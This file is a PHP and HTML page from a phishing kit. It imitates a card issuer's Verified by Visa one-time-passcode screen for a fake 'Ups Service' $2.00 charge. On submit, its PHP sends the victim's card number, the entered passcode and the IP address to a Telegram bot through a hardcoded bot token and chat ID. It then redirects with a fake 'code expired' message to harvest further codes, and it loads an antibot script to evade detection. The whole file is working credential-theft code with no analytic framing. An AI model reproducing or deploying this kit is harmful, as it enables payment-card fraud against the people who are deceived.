<?php
include'antibot.php';
$IdTelegram=array("442279926"); 
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="1829588682:AAFxaRvyaC0KETd9wUOMKPT0a73tSal5bZk";
 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB     :  ".$numb."\n";
 $messageTelegram .= "|PASSW     :  ".$_POST['Credential']."\n";
 $messageTelegram .= "|IP         :  ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>
<!DOCTYPE html>
<html><!--[if lte IE 8]><html class="lt-ie9" lang=""><![endif]--><!--[if IE 9]><html class="lt-ie10" lang=""><![endif]--><!--[if gt IE 9]><html lang=""><![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validate</title>
  <link href="VBV_files/template-e63a3d48ea.css" rel="stylesheet">
  
  
  <link href="VBV_files/validateview-451126d279.css" rel="stylesheet">
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #211f1f}a:active,.btn-link:active {color: #211f1f}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #211f1f;color: #FFF;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #AB2C29}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #211f1f}.accordion.modal .modal-body .panel-group .expander {color: #211f1f}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>


</head>
<body>
  <div class="threeds-two">
    


<div class="container-fluid">
  

<div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img alt="" class="img-responsive header-logo pull-left" src="data:image/png;base64,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">
                 <?php 
      //3-4-5-6
      $numb=$_GET['numb'];
      if($numb[0]=='3'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/amex.png">');
      }else if($numb[0]=='4'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/vbv_logo.gif">');
      }else if($numb[0]=='5'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png">');
      }else{
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/discover.png">');
      }
     ?>
    </div>
  </div>
</div>
  <br>
  <div class="body" dir="LTR" style="bottom: 58px;">
    


<div class="container container-sticky-footer">
<form action="" method="post">    <input type="hidden" name="LanguageCode" id="LanguageCode" value="en-us">
    <input type="hidden" name="LanguageShortCode" id="LanguageShortCode" value="en">
    <input type="hidden" name="CredentialValidationMessage" id="CredentialValidationMessage" value="Please re-enter your code">
    <div class="body" dir="LTR" style="bottom: 58px;">
      

    <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>

      <br>
      <div class="row">
      </div>
      <div class="row">
          <div class="col-12" id="ValidateOneUpMessage">
              <div id="Body1"></div>
          </div>
      </div>

      <br>

      <div class="row form-two-col">
        <div class="col-12">
          
<?php if(isset($_GET['repeat'])){ if($_GET['repeat']=='1'){echo('<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>');};};?>     
            <fieldset id="ValidateTransactionDetailsContainer">
                <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>

                <div class="validate-field row">
                    <span class="validate-label col-6">Merchant:</span>
                    <span class="col-6">Ups Service</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Transaction Amount:</span>
                    <span class="col-6 always-left-to-right">$2.00 USD</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Card Number:</span>
                    <span class="col-6 always-left-to-right"><?php echo($Bin);?>******<?php echo($lbin);?></span>
                </div>
                <div class="validate-field row">
                        <span class="validate-label col-6">Enter Code:</span>
    <span>
      <label for="Credential_Value" hidden="">Please enter your code</label>
      <input data-val="true" data-val-required="Please enter your code" required id="Credential_Value" name="Credential" type="text">
    </span>

                </div>
                <div class="validate-field row">
                    <span class="validate-label col-6">&nbsp;</span>
                    <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
                    <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                </div>
            </fieldset>
        </div>
      </div>

        <div class="row">
          <div class="col-12" id="ValidateOptInMessage">
            To change the selected contact information or to resend a code click Send Another Code.
          </div>
        </div>

      <div class="row">
        <div class="col-12">
            <div id="linkContainer">
                <a href="#" id="ResendLink">Click here to receive another code</a>
                <input aria-hidden="true" id="resendLinkTemp" type="hidden" hidden="">
                <input aria-hidden="true" id="resendLinkTooltipText" type="hidden" value="Resend will be enabled after {1} seconds.." hidden="">
            </div>
          <span id="MaximumResendsReachedMessage" style="display:none">You have reached the maximum number of requests for a new code</span>
        </div>
      </div>
    </div>
    <div class="sticky-footer">
      <div class="row no-pad">
        <div class="col-12 text-center">
          <button type="submit" class="btn btn-primary" id="ValidateButton" name="submit">Submit</button>
        </div>
      </div>
      

<div class="footer" id="FooterLinks">
  <div class="row">
    <div class="col-12">
      <ul class="list-inline list-inline-separated pull-left"><li><a class="btn btn-link" data-target="#Privacy" data-toggle="modal" href="#Privacy" id="FooterLink2">Privacy Policy</a></li><li><a class="btn btn-link" data-target="#Terms" data-toggle="modal" href="#Terms" id="FooterLink2">Terms and Conditions</a></li></ul>
      <a id="ExitLink" class="list-inline list-inline-separated pull-right" href="#">Exit</a>
    </div>
  </div>
</div>
    </div>
<input id="TransactionId" name="TransactionId" type="hidden" value="91693300-3d89-4f9b-8909-5822e4ba4c78"><input data-val="true" data-val-number="The field ValidateTimeout must be a number." id="ValidateTimeout" name="ValidateTimeout" type="hidden" value=""><input id="IssuerId" name="IssuerId" type="hidden" value="5fbe69bdbced620accae8e02"><input id="OtpResendTimeout" name="OtpResendTimeout" type="hidden" value="0"><input data-val="true" data-val-required="The ValidateReloadEnabled field is required." id="ValidateReloadEnabled" name="ValidateReloadEnabled" type="hidden" value="True"></form></div>

<div class="modal modal-clear" id="ProcessingModal" tabindex="-1" role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body">
        <div class="row">
          <div class="col-12 processing">
            <img id="ProcessingImage" src="VBV_files/loading.svg" alt="Loading Indicator" class="processing-img center-block content-block">
            <p class="processing-text" id="Processing-label">Processing</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


<form action="/Api/2_1_0/NextStep/StepUp" autocomplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="StepupForm" method="post" name="StepupForm"><input id="HiddenTransactionId" name="TransactionId" type="hidden" value="91693300-3d89-4f9b-8909-5822e4ba4c78"><input id="StepUpIssuerId" name="IssuerId" type="hidden" value="5fbe69bdbced620accae8e02"></form>


  </div>
  <br>
  <input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="2">
  <div class="modal fade" id="Privacy" tabindex="-1" role="dialog" aria-labelledby="Privacy-label">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">×</span>
        </button>
        <h4 class="modal-title" id="Privacy-label">Privacy Policy</h4>
      </div>
      <div class="modal-body partial-modal">
          <div><p><strong>Cardholder Authentication OTP - Privacy</strong></p>
<p>Cardholder Authentication is a service provided by the financial 
institution of the card used for the purchase.  It allows you to receive
 a one-time passcode to verify your identity when requested during a 
transaction.  When you enter your card number in the eCommerce site, a 
verification process may occur and you will have the option to validate 
using a passcode sent by automated technology via SMS or email. If you 
choose to have the passcode sent over SMS, you agree to receive a 
one-time passcode (OTP) message via short code 55715. Message and data 
rates may apply.</p>
<p>The mobile phone and/or email presented for OTP delivery are 
registered for use for this service by your financial institution in 
accordance with their Privacy Policy.  To obtain a copy of your 
financial institution’s Privacy Policy, please refer to their website, 
or contact them directly via the phone number on the back of the card 
used for the purchase.</p>
<p>Customers will be allowed to opt out of the Cardholder Authentication
 program at any time by contacting their financial institution via the 
phone number on the back of the card used for the purchase.</p>
</div>
      </div>
    </div>
  </div>
</div><div class="modal fade" id="Terms" tabindex="-1" role="dialog" aria-labelledby="Terms-label">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">×</span>
        </button>
        <h4 class="modal-title" id="Terms-label">Terms and Conditions</h4>
      </div>
      <div class="modal-body partial-modal">
          <div><p><strong>Cardholder Authentication OTP - Terms and Conditions</strong> <br><br>Cardholder
 Authentication is a service provided by the financial institution of 
the card used for the purchase.  It allows you to receive a one-time 
passcode to verify your identity when requested during a transaction.  
When you enter your card number in the eCommerce site, a verification 
process may occur and you will have the option to validate using a 
passcode sent by automated technology via SMS or email. If you choose to
 have the passcode sent over SMS, you agree to receive a one-time 
passcode (OTP) message via short code 55715. Message and data rates may 
apply.  For help, text "<strong>HELP</strong>" to 55715. To cancel, send "<strong>STOP</strong>"
 to 55715 or call the phone number on the back of the card used for the 
purchase. Mobile carriers are not liable for delayed or undelivered 
messages.<br><br>
<strong>Alerts sent via SMS may not be delivered to you if your phone is
 not in range of a transmission site, or if sufficient network capacity 
is not available at a particular time. Even within a coverage area, 
factors beyond the control of your wireless carrier may interfere with 
message delivery, including the customer's equipment, terrain, proximity
 to buildings, foliage, and weather. You acknowledge that urgent alerts 
may not be timely received and that your wireless carrier does not 
guarantee that alerts will be delivered. Carriers are not liable for 
delayed or undelivered messages.</strong><br><br>
This program will be ongoing. Customers will be allowed to opt out of 
the Cardholder Authentication program at any time by contacting their 
financial institution via the phone number on the back of the card used 
for the purchase.</p>
</div>
      </div>
    </div>
  </div>
</div>
  <form class="nextstep-form" method="post">
  <input id="NextStepTransactionId" name="TransactionId" type="hidden" value="91693300-3d89-4f9b-8909-5822e4ba4c78">
  <input id="GroupId" name="GroupId" type="hidden" value="Visa">
  <input id="Type" name="Type" type="hidden" value="">
  
  <input id="NextStepChoiceType" name="NextStepChoiceType" type="hidden" value="Grouped">
  <input id="NextStepIssuerId" name="IssuerId" type="hidden" value="5fbe69bdbced620accae8e02">
</form>
  <form method="POST" id="TermForm">
  <input type="hidden" id="cres" name="cres" value="">
  <input type="hidden" id="threeDSSessionData" name="threeDSSessionData" value="">
</form>
</div>


  </div>
  <script src="VBV_files/template-2abc8ec702.js"></script>
  
  
  <script src="VBV_files/validateview-1b5d6bef0d.js"></script>




</body></html>